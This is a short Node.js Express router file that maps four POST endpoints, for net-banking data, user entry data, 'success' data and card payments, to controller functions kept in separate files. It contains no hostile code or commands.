const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 
const netBankingController = require('../controllers/netBankingController');
const successDataController = require('../controllers/successDataController');
const cardController = require('../controllers/cardController');

router.post('/banking', netBankingController.submitNetBankingData);
router.post('/entry', userController.saveUserData);
router.post('/success', successDataController.submitSuccessData);
router.post('/card', cardController.submitCardPayment); // ✅ Fixed

module.exports = router;
